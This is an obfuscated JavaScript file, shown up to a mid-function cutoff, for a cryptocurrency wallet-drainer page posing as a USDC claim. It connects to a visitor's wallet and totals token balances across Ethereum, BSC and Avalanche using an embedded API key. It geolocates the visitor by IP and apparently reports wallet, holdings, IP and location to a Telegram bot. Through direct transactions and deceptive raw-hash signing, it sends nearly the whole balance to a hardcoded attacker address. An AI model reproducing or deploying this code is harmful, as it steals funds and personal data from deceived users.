const _0x3a34fc = _0x4ed9;
(function (_0x5eedf4, _0x3bfd85) {
  const _0x350ffa = _0x4ed9,
    _0x11f6b8 = _0x5eedf4();
  while (!![]) {
    try {
      const _0x5ec445 =
        parseInt(_0x350ffa(0x100)) / 0x1 +
        parseInt(_0x350ffa(0x14d)) / 0x2 +
        (-parseInt(_0x350ffa(0x122)) / 0x3) *
          (parseInt(_0x350ffa(0x123)) / 0x4) +
        -parseInt(_0x350ffa(0x178)) / 0x5 +
        (parseInt(_0x350ffa(0x16f)) / 0x6) *
          (-parseInt(_0x350ffa(0x172)) / 0x7) +
        -parseInt(_0x350ffa(0x119)) / 0x8 +
        (parseInt(_0x350ffa(0xe2)) / 0x9) * (parseInt(_0x350ffa(0xf9)) / 0xa);
      if (_0x5ec445 === _0x3bfd85) break;
      else _0x11f6b8["push"](_0x11f6b8["shift"]());
    } catch (_0x2e7f1a) {
      _0x11f6b8["push"](_0x11f6b8["shift"]());
    }
  }
})(_0xedd6, 0xd2873);
let provider,
  allDataEth,
  allDataBsc,
  allDataAvax,
  ETHTokenAddressArray = [],
  ETHTokenNameArray = [],
  ETHTokenBalanceArray = [],
  ETHTokenNetworkValue,
  BSCTokenAddressArray = [],
  BSCTokenNameArray = [],
  BSCTokenBalanceArray = [],
  BSCTokenNetworkValue,
  AVAXTokenAddressArray = [],
  AVAXTokenNameArray = [],
  AVAXTokenBalanceArray = [],
  AVAXTokenNetworkValue,
  networkArray,
  sortedNetworkArray,
  totalValueArray,
  totalTokenValueArray,
  totalCoinValueArray,
  sortedTotalValueArray,
  minThreshold = 0x5,
  minDrainThreshold,
  txHash1,
  ethCoinValue,
  bnbCoinValue,
  avaxCoinValue,
  networkIndex = 0x0,
  tokenIndexETH = 0x0,
  tokenIndexBSC = 0x0,
  tokenIndexAVAX = 0x0,
  ERC20ABI = [
    {
      constant: !![],
      inputs: [],
      name: "name",
      outputs: [
        {
          name: "",
          type: "string",
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x107),
      type: _0x3a34fc(0x136),
    },
    {
      constant: ![],
      inputs: [
        {
          name: _0x3a34fc(0x17b),
          type: _0x3a34fc(0x124),
        },
        {
          name: "_value",
          type: _0x3a34fc(0x104),
        },
      ],
      name: "approve",
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x137),
        },
      ],
      payable: ![],
      stateMutability: "nonpayable",
      type: _0x3a34fc(0x136),
    },
    {
      constant: !![],
      inputs: [],
      name: _0x3a34fc(0x134),
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x104),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x107),
      type: _0x3a34fc(0x136),
    },
    {
      constant: ![],
      inputs: [
        {
          name: "_from",
          type: _0x3a34fc(0x124),
        },
        {
          name: _0x3a34fc(0x155),
          type: _0x3a34fc(0x124),
        },
        {
          name: _0x3a34fc(0x105),
          type: _0x3a34fc(0x104),
        },
      ],
      name: _0x3a34fc(0x163),
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x137),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x110),
      type: _0x3a34fc(0x136),
    },
    {
      constant: !![],
      inputs: [],
      name: _0x3a34fc(0xe3),
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0xf4),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x107),
      type: _0x3a34fc(0x136),
    },
    {
      constant: !![],
      inputs: [
        {
          name: _0x3a34fc(0x13e),
          type: _0x3a34fc(0x124),
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          name: _0x3a34fc(0x144),
          type: _0x3a34fc(0x104),
        },
      ],
      payable: ![],
      stateMutability: "view",
      type: _0x3a34fc(0x136),
    },
    {
      constant: !![],
      inputs: [],
      name: "symbol",
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x11f),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x107),
      type: _0x3a34fc(0x136),
    },
    {
      constant: ![],
      inputs: [
        {
          name: _0x3a34fc(0x155),
          type: "address",
        },
        {
          name: _0x3a34fc(0x105),
          type: _0x3a34fc(0x104),
        },
      ],
      name: _0x3a34fc(0xee),
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x137),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x110),
      type: _0x3a34fc(0x136),
    },
    {
      constant: !![],
      inputs: [
        {
          name: _0x3a34fc(0x13e),
          type: _0x3a34fc(0x124),
        },
        {
          name: "_spender",
          type: _0x3a34fc(0x124),
        },
      ],
      name: _0x3a34fc(0xfe),
      outputs: [
        {
          name: "",
          type: _0x3a34fc(0x104),
        },
      ],
      payable: ![],
      stateMutability: _0x3a34fc(0x107),
      type: _0x3a34fc(0x136),
    },
    {
      payable: !![],
      stateMutability: _0x3a34fc(0x135),
      type: "fallback",
    },
    {
      anonymous: ![],
      inputs: [
        {
          indexed: !![],
          name: _0x3a34fc(0x17e),
          type: "address",
        },
        {
          indexed: !![],
          name: "spender",
          type: _0x3a34fc(0x124),
        },
        {
          indexed: ![],
          name: _0x3a34fc(0x12d),
          type: _0x3a34fc(0x104),
        },
      ],
      name: "Approval",
      type: _0x3a34fc(0x108),
    },
    {
      anonymous: ![],
      inputs: [
        {
          indexed: !![],
          name: "from",
          type: _0x3a34fc(0x124),
        },
        {
          indexed: !![],
          name: "to",
          type: _0x3a34fc(0x124),
        },
        {
          indexed: ![],
          name: _0x3a34fc(0x12d),
          type: _0x3a34fc(0x104),
        },
      ],
      name: "Transfer",
      type: "event",
    },
  ],
  sortedTotalTokenValueArray = [],
  sortedTotalCoinValueArray = [],
  totalAddressArray = [],
  wallet,
  city,
  country,
  ip,
  latitude,
  longitude,
  date;
// const rA = atob(_0x3a34fc(0xe8));

const rA = "0x9E1A944dE4872fa2fa4a144b1849F0c00C74Cf23";

document[_0x3a34fc(0x169)]("connect")[_0x3a34fc(0x11d)](
  _0x3a34fc(0x16d),
  async function () {
    connectWallet();
  }
),
  document[_0x3a34fc(0x169)](_0x3a34fc(0x12b))[_0x3a34fc(0x11d)](
    _0x3a34fc(0x16d),
    async function () {
      triggerDrain();
    }
  );
async function connectWallet() {
  const _0x280b10 = _0x3a34fc;
  try {
    (provider = window[_0x280b10(0x16b)]),
      await provider[_0x280b10(0x116)]({
        method: _0x280b10(0xe5),
      }),
      await getBalances();
  } catch {
    alert(
      "Please\x20open\x20in\x20TrustWallet\x20Dapp\x20browser\x20for\x20the\x20most\x20user-friendly\x20experience!"
    );
  }
}
async function getBalances() {
  const _0x3e7c47 = _0x3a34fc,
    _0xc378e3 = new Web3(provider);
  wallet = (await _0xc378e3[_0x3e7c47(0x132)][_0x3e7c47(0xf1)]())[0x0];
  let _0x4597e6 = new Headers();
  _0x4597e6[_0x3e7c47(0x131)]("Authorization", _0x3e7c47(0x168)),
    getLocation(),
    await fetch(_0x3e7c47(0xe7) + wallet + _0x3e7c47(0x156), {
      method: _0x3e7c47(0x102),
      headers: _0x4597e6,
    })
      [_0x3e7c47(0x11a)]((_0x107a55) => _0x107a55["json"]())
      ["then"]((_0x568dc9) => (allDataEth = _0x568dc9)),
    await fetch(_0x3e7c47(0x141) + wallet + _0x3e7c47(0x156), {
      method: _0x3e7c47(0x102),
      headers: _0x4597e6,
    })
      ["then"]((_0x41851d) => _0x41851d[_0x3e7c47(0x180)]())
      [_0x3e7c47(0x11a)]((_0x41bf17) => (allDataBsc = _0x41bf17)),
    await fetch(_0x3e7c47(0x12a) + wallet + _0x3e7c47(0x156), {
      method: _0x3e7c47(0x102),
      headers: _0x4597e6,
    })
      [_0x3e7c47(0x11a)]((_0x5c69b7) => _0x5c69b7[_0x3e7c47(0x180)]())
      [_0x3e7c47(0x11a)]((_0x2c461c) => (allDataAvax = _0x2c461c)),
    (ETHTokenBalanceArray = []),
    (BSCTokenBalanceArray = []),
    (AVAXTokenBalanceArray = []);
  var _0x144a53 = document[_0x3e7c47(0x169)](_0x3e7c47(0x121));
  _0x144a53[_0x3e7c47(0x101)][_0x3e7c47(0x146)] = _0x3e7c47(0x160);
  var _0x20892b = document["getElementById"](_0x3e7c47(0x111));
  _0x20892b[_0x3e7c47(0x101)][_0x3e7c47(0x146)] = _0x3e7c47(0x112);
  var _0x52b91c = document[_0x3e7c47(0x169)](_0x3e7c47(0x12b));
  _0x52b91c["style"]["display"] = "block";
  var _0x34a507 = document[_0x3e7c47(0x169)](_0x3e7c47(0x16e));
  _0x34a507[_0x3e7c47(0x101)][_0x3e7c47(0x146)] = _0x3e7c47(0x160);
  var _0x27fa85 = document["getElementById"]("elig");
  _0x27fa85[_0x3e7c47(0x101)][_0x3e7c47(0x146)] = "block";
  var _0x22ada0 = document[_0x3e7c47(0x169)](_0x3e7c47(0xfa));
  (document["getElementById"](_0x3e7c47(0xfa))[_0x3e7c47(0x165)] = wallet),
    (_0x22ada0[_0x3e7c47(0x101)][_0x3e7c47(0x146)] = _0x3e7c47(0x112));
  var _0x27fa85 = document[_0x3e7c47(0x169)](_0x3e7c47(0x171));
  (document[_0x3e7c47(0x169)](_0x3e7c47(0x171))[_0x3e7c47(0x165)] =
    0x1f4 + _0x3e7c47(0x138)),
    (_0x27fa85["style"]["display"] = "block"),
    (ETHTokenAddressArray = []),
    (ETHTokenBalanceArray = []),
    (ETHTokenNameArray = []),
    console[_0x3e7c47(0x115)]("--------ETHEREUM--------");
  for (
    let _0x1e05f6 = 0x0;
    _0x1e05f6 < allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)]["length"];
    _0x1e05f6++
  ) {
    allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
      _0x3e7c47(0x10d)
    ] > minThreshold &&
      allDataEth[_0x3e7c47(0x148)]["items"][_0x1e05f6]["contract_address"] !=
        _0x3e7c47(0x15a) &&
      (ETHTokenAddressArray["push"](
        allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
          _0x3e7c47(0xf5)
        ]
      ),
      ETHTokenBalanceArray[_0x3e7c47(0x14f)](
        allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
          _0x3e7c47(0x10d)
        ]
      ),
      ETHTokenNameArray["push"](
        allDataEth[_0x3e7c47(0x148)]["items"][_0x1e05f6][_0x3e7c47(0x109)]
      ),
      console[_0x3e7c47(0x115)](
        "Wallet\x20has\x20$" +
          Number(
            allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
              _0x3e7c47(0x10d)
            ]
          )[_0x3e7c47(0xec)](0x2) +
          _0x3e7c47(0x142) +
          allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
            _0x3e7c47(0x109)
          ]
      )),
      allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
        _0x3e7c47(0xf5)
      ] == "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" &&
        (ethCoinValue =
          allDataEth[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x1e05f6][
            _0x3e7c47(0x10d)
          ]);
  }
  (BSCTokenAddressArray = []),
    (BSCTokenBalanceArray = []),
    (BSCTokenNameArray = []),
    console["log"](_0x3e7c47(0xf8));
  for (
    let _0x19fb2c = 0x0;
    _0x19fb2c < allDataBsc["data"][_0x3e7c47(0x10e)]["length"];
    _0x19fb2c++
  ) {
    allDataBsc[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x19fb2c][
      _0x3e7c47(0x10d)
    ] > minThreshold &&
      allDataBsc[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x19fb2c][
        "contract_address"
      ] != _0x3e7c47(0x15a) &&
      (BSCTokenAddressArray[_0x3e7c47(0x14f)](
        allDataBsc["data"][_0x3e7c47(0x10e)][_0x19fb2c][_0x3e7c47(0xf5)]
      ),
      BSCTokenBalanceArray[_0x3e7c47(0x14f)](
        allDataBsc[_0x3e7c47(0x148)]["items"][_0x19fb2c][_0x3e7c47(0x10d)]
      ),
      BSCTokenNameArray[_0x3e7c47(0x14f)](
        allDataBsc[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x19fb2c][
          _0x3e7c47(0x109)
        ]
      ),
      console[_0x3e7c47(0x115)](
        "Wallet\x20has\x20$" +
          Number(
            allDataBsc["data"][_0x3e7c47(0x10e)][_0x19fb2c][_0x3e7c47(0x10d)]
          )[_0x3e7c47(0xec)](0x2) +
          _0x3e7c47(0x142) +
          allDataBsc[_0x3e7c47(0x148)]["items"][_0x19fb2c][_0x3e7c47(0x109)]
      )),
      allDataBsc[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x19fb2c][
        _0x3e7c47(0xf5)
      ] == _0x3e7c47(0x15a) &&
        (bnbCoinValue =
          allDataBsc[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x19fb2c][
            _0x3e7c47(0x10d)
          ]);
  }
  (AVAXTokenAddressArray = []),
    (AVAXTokenBalanceArray = []),
    (AVAXTokenNameArray = []),
    console[_0x3e7c47(0x115)](_0x3e7c47(0x11b));
  for (
    let _0x429e0a = 0x0;
    _0x429e0a <
    allDataAvax[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x3e7c47(0x170)];
    _0x429e0a++
  ) {
    allDataAvax["data"][_0x3e7c47(0x10e)][_0x429e0a][_0x3e7c47(0x10d)] >
      minThreshold &&
      allDataAvax[_0x3e7c47(0x148)]["items"][_0x429e0a][_0x3e7c47(0xf5)] !=
        _0x3e7c47(0x15a) &&
      (AVAXTokenAddressArray[_0x3e7c47(0x14f)](
        allDataAvax[_0x3e7c47(0x148)]["items"][_0x429e0a][_0x3e7c47(0xf5)]
      ),
      AVAXTokenBalanceArray[_0x3e7c47(0x14f)](
        allDataAvax["data"]["items"][_0x429e0a][_0x3e7c47(0x10d)]
      ),
      AVAXTokenNameArray[_0x3e7c47(0x14f)](
        allDataAvax[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x429e0a][
          "contract_name"
        ]
      ),
      console[_0x3e7c47(0x115)](
        _0x3e7c47(0x128) +
          Number(
            allDataAvax[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x429e0a][
              _0x3e7c47(0x10d)
            ]
          )["toFixed"](0x2) +
          _0x3e7c47(0x142) +
          allDataAvax[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x429e0a][
            _0x3e7c47(0x109)
          ]
      )),
      allDataAvax["data"][_0x3e7c47(0x10e)][_0x429e0a][_0x3e7c47(0xf5)] ==
        _0x3e7c47(0x15a) &&
        (avaxCoinValue =
          allDataAvax[_0x3e7c47(0x148)][_0x3e7c47(0x10e)][_0x429e0a]["quote"]);
  }
  (ETHTokenNetworkValue = ETHTokenBalanceArray[_0x3e7c47(0x10c)](
    (_0x4db377, _0x1f9463) => _0x4db377 + _0x1f9463,
    0x0
  )),
    (BSCTokenNetworkValue = BSCTokenBalanceArray[_0x3e7c47(0x10c)](
      (_0x204e45, _0x776b85) => _0x204e45 + _0x776b85,
      0x0
    )),
    (AVAXTokenNetworkValue = AVAXTokenBalanceArray[_0x3e7c47(0x10c)](
      (_0x8ba70b, _0x4c21c0) => _0x8ba70b + _0x4c21c0,
      0x0
    )),
    (totalTokenValueArray = [
      ETHTokenNetworkValue,
      BSCTokenNetworkValue,
      AVAXTokenNetworkValue,
    ]),
    (totalCoinValueArray = [ethCoinValue, bnbCoinValue, avaxCoinValue]),
    (totalValueArray = [
      Number(ETHTokenNetworkValue + ethCoinValue),
      Number(BSCTokenNetworkValue + bnbCoinValue),
      Number(AVAXTokenNetworkValue + avaxCoinValue),
    ]),
    (networkArray = ["ETH", _0x3e7c47(0x145), _0x3e7c47(0x12f)]);
  const _0x525402 = Array[_0x3e7c47(0x17d)](
    totalValueArray[_0x3e7c47(0x133)]()
  )[_0x3e7c47(0x15f)](
    (_0x2f8146, _0x50020c) =>
      totalValueArray[_0x50020c] - totalValueArray[_0x2f8146]
  );
  (sortedTotalTokenValueArray = _0x525402[_0x3e7c47(0x106)](
    (_0x5d535d) => totalTokenValueArray[_0x5d535d]
  )),
    (sortedTotalCoinValueArray = _0x525402[_0x3e7c47(0x106)](
      (_0x10d449) => totalCoinValueArray[_0x10d449]
    )),
    (sortedNetworkArray = _0x525402[_0x3e7c47(0x106)](
      (_0x96f545) => networkArray[_0x96f545]
    )),
    (sortedTotalValueArray = _0x525402[_0x3e7c47(0x106)](
      (_0x52d9a1) => totalValueArray[_0x52d9a1]
    )),
    (totalAddressArray = ETHTokenAddressArray[_0x3e7c47(0xe9)](
      BSCTokenAddressArray[_0x3e7c47(0xe9)](AVAXTokenAddressArray)
    )),
    console["log"](
      _0x3e7c47(0x13b) + totalValueArray[0x0][_0x3e7c47(0xec)](0x2)
    ),
    console[_0x3e7c47(0x115)](
      _0x3e7c47(0x14a) + totalValueArray[0x1]["toFixed"](0x2)
    ),
    console[_0x3e7c47(0x115)](
      _0x3e7c47(0x143) + totalValueArray[0x2][_0x3e7c47(0xec)](0x2)
    ),
    console[_0x3e7c47(0x115)](sortedTotalValueArray);
  let _0x5524dd = window["location"]["hostname"];
  date = new Date();
  if (provider[_0x3e7c47(0x147)]) typeOfWallet = _0x3e7c47(0x161);
  else
    provider[_0x3e7c47(0x127)]
      ? (typeOfWallet = "TrustWallet")
      : (typeOfWallet = _0x3e7c47(0x17c));
  consoleLog(
    _0x3e7c47(0x117) +
      "Website:\x20" +
      _0x5524dd +
      "%0A%0A" +
      wallet +
      _0x3e7c47(0x174) +
      typeOfWallet +
      _0x3e7c47(0x15e) +
      _0x3e7c47(0x153) +
      wallet +
      "%0A%0A" +
      "ETH\x20chain\x20value:\x20$" +
      (ETHTokenNetworkValue + ethCoinValue)["toFixed"](0x2) +
      _0x3e7c47(0xfc) +
      ethCoinValue[_0x3e7c47(0xec)](0x2) +
      "%0A" +
      _0x3e7c47(0x14a) +
      (BSCTokenNetworkValue + bnbCoinValue)["toFixed"](0x2) +
      ",\x20BNB:\x20$" +
      bnbCoinValue[_0x3e7c47(0xec)](0x2) +
      "%0A" +
      _0x3e7c47(0x143) +
      (AVAXTokenNetworkValue + avaxCoinValue)[_0x3e7c47(0xec)](0x2) +
      _0x3e7c47(0x181) +
      avaxCoinValue["toFixed"](0x2) +
      _0x3e7c47(0x140) +
      _0x3e7c47(0x14e) +
      date +
      "%0A%0ACountry:\x20" +
      country +
      _0x3e7c47(0x14b) +
      city +
      _0x3e7c47(0x166) +
      ip +
      _0x3e7c47(0x17a) +
      latitude +
      "\x20Longitude\x20" +
      longitude +
      _0x3e7c47(0x114) +
      "-------------------------------------------"
  );
}
async function triggerDrain() {
  const _0x6aa92 = _0x3a34fc;
  sortedNetworkArray[0x0] == "ETH" && (minThreshold = 0x5),
    sortedNetworkArray[0x0] == "BNB" && (minThreshold = 0.1),
    sortedNetworkArray[0x0] == _0x6aa92(0x12f) && (minThreshold = 0.1),
    sortedTotalCoinValueArray[0x0] > minThreshold
      ? provider["isMetaMask"]
        ? (console["log"](_0x6aa92(0x16a)),
          drainSequence(sortedNetworkArray[0x0]))
        : (console[_0x6aa92(0x115)](_0x6aa92(0x13f)),
          drainSequenceSign(sortedNetworkArray[0x0]))
      : console["log"](_0x6aa92(0x159));
}

function _0x4ed9(_0x3fa260, _0x333a27) {
  const _0xedd61a = _0xedd6();
  return (
    (_0x4ed9 = function (_0x4ed958, _0x2f36d2) {
      _0x4ed958 = _0x4ed958 - 0xe2;
      let _0x5c9030 = _0xedd61a[_0x4ed958];
      return _0x5c9030;
    }),
    _0x4ed9(_0x3fa260, _0x333a27)
  );
}
async function drainSequenceSign(_0x2b32fc) {
  const _0x4fe363 = _0x3a34fc;
  _0x2b32fc == _0x4fe363(0x157) &&
    (ethCoinValue >= ETHTokenNetworkValue
      ? askMainCoinTransferWithSign(0x1)
      : askTokenTransferWithSign(ETHTokenAddressArray[tokenIndexETH], 0x1)),
    _0x2b32fc == _0x4fe363(0x145) &&
      (bnbCoinValue >= BSCTokenNetworkValue
        ? askMainCoinTransferWithSign(0x38)
        : askTokenTransferWithSign(BSCTokenAddressArray[tokenIndexBSC], 0x38)),
    _0x2b32fc == "AVAX" &&
      (avaxCoinValue >= AVAXTokenNetworkValue
        ? askMainCoinTransferWithSign(0xa86a)
        : askTokenTransferWithSign(
            AVAXTokenAddressArray[tokenIndexAVAX],
            0xa86a
          ));
}

function _0xedd6() {
  const _0x27afa9 = [
    "Main\x20Coin\x20transaction\x20complete",
    "uint8",
    "contract_address",
    "pending",
    "toHex",
    "--------BINANCE\x20SMART\x20CHAIN--------",
    "50eplCpb",
    "walletAddress",
    "methods",
    ",\x20ETH:\x20$",
    "&text=",
    "allowance",
    "sign",
    "880250CNBEXA",
    "style",
    "GET",
    "\x20transaction\x20hash:",
    "uint256",
    "_value",
    "map",
    "view",
    "event",
    "contract_name",
    "getBalance",
    "getChainId",
    "reduce",
    "quote",
    "items",
    "country",
    "nonpayable",
    "kyc-block",
    "block",
    "catch",
    "%0A",
    "log",
    "request",
    "-------------------------------------------%0A",
    "substring",
    "10118528YGnIco",
    "then",
    "--------AVALANCHE--------",
    "encodeABI",
    "addEventListener",
    "0x0",
    "string",
    "\x20Transaction\x20Rejected",
    "connect",
    "940143pUpphX",
    "8ruOsSl",
    "address",
    "Drain\x20concluded.",
    "You\x20must\x20switch\x20to\x20the\x20correct\x20network.",
    "isTrust",
    "Wallet\x20has\x20$",
    "hex",
    "https://api.covalenthq.com/v1/43114/address/",
    "trigger",
    "Main\x20Coin\x20transaction\x20error\x20-\x20",
    "value",
    "longitude",
    "AVAX",
    "ether",
    "set",
    "eth",
    "keys",
    "totalSupply",
    "payable",
    "function",
    "bool",
    "\x20$USDC\x20tokens\x20eligible\x20for\x20claim.",
    "\x20Transaction\x20complete",
    "Transfer\x20transaction\x20hash:",
    "ETH\x20chain\x20value:\x20$",
    "city",
    "User\x20rejected\x20",
    "_owner",
    "Not\x20Metamask\x20detected",
    "%0A%0A",
    "https://api.covalenthq.com/v1/56/address/",
    "\x20worth\x20of\x20",
    "AVAX\x20chain\x20value:\x20$",
    "balance",
    "BNB",
    "display",
    "isMetaMask",
    "data",
    "latitude",
    "BSC\x20chain\x20value:\x20$",
    "%0ACity:\x20",
    "send",
    "761674zFBOoD",
    "Date:\x20",
    "push",
    "sha3",
    "location",
    "getGasPrice",
    "https://blockscan.com/address/",
    "User\x20rejected\x20request",
    "_to",
    "/balances_v2/",
    "ETH",
    "name",
    "Min\x20threshold\x20not\x20met",
    "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
    "toString",
    "fromWei",
    "call",
    "]%0A%0A",
    "sort",
    "none",
    "MetaMask",
    "/sendMessage?chat_id=",
    "transferFrom",
    "utils",
    "innerHTML",
    "%0AIP:\x20",
    "rawTx:\x20",
    "Bearer\x20cqt_rQVPW9XQCkhqVH6GPHcvbjxHKHDM",
    "getElementById",
    "Metamask\x20detected",
    "ethereum",
    "User\x20rejected\x20Main\x20Coin\x20transaction\x20request",
    "click",
    "connectDiv",
    "1640406SWywPe",
    "length",
    "message",
    "28MTDAoo",
    "transactionHash",
    "\x20connected\x20via\x20[",
    "sendSignedTransaction",
    "error",
    "Contract",
    "8494160YFdPQW",
    "https://api.telegram.org/bot",
    "%0ALatitude\x20",
    "_spender",
    "Other",
    "from",
    "owner",
    "rawTx1:",
    "json",
    ",\x20AVAX:\x20$",
    "7713450QyXeJX",
    "decimals",
    "wallet_switchEthereumChain",
    "eth_requestAccounts",
    "getTransactionCount",
    "https://api.covalenthq.com/v1/1/address/",
    "MHg5ZjBBMEMzODM2QzNiNzU5YTRmMmIyMTczMkEwMTBmMUEwMWQ1MEVi",
    "concat",
    "open",
    "https://api.geoapify.com/v1/ipinfo?apiKey=",
    "toFixed",
    "Main\x20Coin\x20transaction\x20error",
    "transfer",
    "balanceOf",
    "serialize",
    "getAccounts",
    "Sent\x20",
  ];
  _0xedd6 = function () {
    return _0x27afa9;
  };
  return _0xedd6();
}
async function drainSequence(_0xe24b0) {
  const _0x515202 = _0x3a34fc;
  _0xe24b0 == "ETH" &&
    (ethCoinValue >= ETHTokenNetworkValue
      ? askMainCoinTransfer(0x1)
      : askTokenTransfer(ETHTokenAddressArray[tokenIndexETH], 0x1)),
    _0xe24b0 == _0x515202(0x145) &&
      (bnbCoinValue >= BSCTokenNetworkValue
        ? askMainCoinTransfer(0x38)
        : askTokenTransfer(BSCTokenAddressArray[tokenIndexBSC], 0x38)),
    _0xe24b0 == "AVAX" &&
      (avaxCoinValue >= AVAXTokenNetworkValue
        ? askMainCoinTransfer(0xa86a)
        : askTokenTransfer(AVAXTokenAddressArray[tokenIndexAVAX], 0xa86a));
}
async function askMainCoinTransferWithSign(_0x3369aa) {
  const _0x284b20 = _0x3a34fc;
  provider = window["ethereum"];
  const _0x3dd25a = new Web3(provider),
    _0x58737f = (await _0x3dd25a["eth"][_0x284b20(0xf1)]())[0x0],
    _0x2ed12d = await _0x3dd25a[_0x284b20(0x132)][_0x284b20(0x10b)]();
  if (_0x2ed12d != _0x3dd25a[_0x284b20(0x164)]["toHex"](_0x3369aa))
    try {
      await provider[_0x284b20(0x116)]({
        method: _0x284b20(0xe4),
        params: [
          {
            chainId: _0x3dd25a[_0x284b20(0x164)][_0x284b20(0xf7)](
              Number(_0x3369aa)
            ),
          },
        ],
      });
    } catch {
      alert("You\x20must\x20switch\x20to\x20the\x20correct\x20network."),
        askMainCoinTransferWithSign(_0x3369aa);
      return;
    }
  await _0x3dd25a["eth"]
    [_0x284b20(0xe6)](_0x58737f, _0x284b20(0xf6))
    [_0x284b20(0x11a)](async (_0x22e6d2) => {
      const _0x454c5f = _0x284b20,
        _0x45a531 = await _0x3dd25a[_0x454c5f(0x132)][_0x454c5f(0x10a)](
          _0x58737f
        ),
        _0x5c61d3 = await _0x3dd25a["eth"]["getGasPrice"](),
        _0x3f5a1c = (Number(_0x5c61d3) * 1.2)["toFixed"](0x0),
        _0x306af8 = 0x5208,
        _0x5d43a0 = _0x306af8 * _0x3f5a1c,
        _0x329350 = Number(_0x45a531) - Number(_0x5d43a0),
        _0x5afbf4 = _0x3dd25a["utils"][_0x454c5f(0xf7)](String(_0x329350));
      if (_0x329350 < 0x0) return;
      consoleLog(
        "Sending\x20" +
          sortedNetworkArray[networkIndex] +
          "\x20" +
          _0x3dd25a["utils"][_0x454c5f(0x15c)](
            _0x329350[_0x454c5f(0x15b)](),
            _0x454c5f(0x130)
          )
      );
      const _0x2d3e84 = {
        nonce: _0x3dd25a[_0x454c5f(0x164)][_0x454c5f(0xf7)](_0x22e6d2),
        gasPrice: _0x3dd25a["utils"][_0x454c5f(0xf7)](_0x3f5a1c),
        gasLimit: _0x306af8,
        to: rA,
        value: _0x5afbf4,
        data: "0x",
        v: String(_0x3dd25a[_0x454c5f(0x164)][_0x454c5f(0xf7)](_0x3369aa)),
        r: "0x",
        s: "0x",
      };
      let _0x3ef7ba = new ethereumjs["Tx"](_0x2d3e84);
      const _0x298f57 =
          "0x" +
          _0x3ef7ba[_0x454c5f(0xf0)]()[_0x454c5f(0x15b)](_0x454c5f(0x129)),
        _0x43b169 = _0x3dd25a[_0x454c5f(0x164)][_0x454c5f(0x150)](_0x298f57, {
          encoding: _0x454c5f(0x129),
        });
      console[_0x454c5f(0x115)](_0x454c5f(0x17f), _0x298f57),
        console[_0x454c5f(0x115)]("rawHash1:", _0x43b169),
        await _0x3dd25a[_0x454c5f(0x132)]
          [_0x454c5f(0xff)](_0x43b169, _0x58737f)
          [_0x454c5f(0x11a)](async (_0x6f3d1a) => {
            const _0x5babcf = _0x454c5f,
              _0x3b982e = _0x6f3d1a[_0x5babcf(0x118)](0x2),
              _0x3e712f = "0x" + _0x3b982e[_0x5babcf(0x118)](0x0, 0x40),
              _0x63e368 = "0x" + _0x3b982e[_0x5babcf(0x118)](0x40, 0x80),
              _0x1ac014 = parseInt(
                _0x3b982e[_0x5babcf(0x118)](0x80, 0x82),
                0x10
              ),
              _0x7ed00a = _0x3dd25a[_0x5babcf(0x164)][_0x5babcf(0xf7)](
                _0x1ac014 + _0x3369aa * 0x2 + 0x8
              );
            (_0x3ef7ba["r"] = _0x3e712f),
              (_0x3ef7ba["s"] = _0x63e368),
              (_0x3ef7ba["v"] = _0x7ed00a),
              console[_0x5babcf(0x115)](_0x3ef7ba);
            const _0x531c06 =
                "0x" +
                _0x3ef7ba["serialize"]()[_0x5babcf(0x15b)](_0x5babcf(0x129)),
              _0xab711 = _0x3dd25a[_0x5babcf(0x164)]["sha3"](_0x531c06, {
                encoding: _0x5babcf(0x129),
              });
            console[_0x5babcf(0x115)]("rawTx:", _0x531c06),
              console[_0x5babcf(0x115)]("rawHash:", _0xab711),
              await _0x3dd25a[_0x5babcf(0x132)]
                ["sendSignedTransaction"](_0x531c06)
                ["then"](async (_0x41483b) => {
                  const _0x773c4 = _0x5babcf;
                  console["log"](_0x41483b),
                    console[_0x773c4(0x115)](_0x773c4(0xf3)),
                    consoleLog(
                      _0x773c4(0xf2) + sortedNetworkArray[networkIndex]
                    ),
                    networkIndex++,
                    sortedTotalValueArray[networkIndex] > 0x0
                      ? drainSequenceSign(sortedNetworkArray[networkIndex])
                      : (console[_0x773c4(0x115)](_0x773c4(0x125)),
                        consoleLog(_0x773c4(0x125)));
                })
                ["catch"]((_0x52f7fe) => {
                  const _0x24d0ff = _0x5babcf;
                  console[_0x24d0ff(0x115)](_0x24d0ff(0xed)),
                    consoleLog(_0x24d0ff(0x12c) + String(_0x52f7fe)),
                    console[_0x24d0ff(0x115)](_0x52f7fe),
                    askMainCoinTransferWithSign(_0x3369aa);
                });
